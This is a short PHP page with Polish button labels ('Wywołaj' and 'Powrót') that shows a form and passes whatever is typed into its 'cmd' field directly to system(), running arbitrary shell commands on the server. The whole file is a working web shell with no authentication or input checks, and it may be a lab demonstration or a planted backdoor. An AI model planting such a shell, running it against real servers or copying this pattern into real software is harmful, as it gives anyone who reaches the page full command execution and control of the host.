<?php

    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }

?>

<form method="post">
    <input type="text" name="cmd">
    <input type="submit" value="Wywołaj >"><br><br>
</form>

<a href='index.php'><button>Powrót ></button></a>
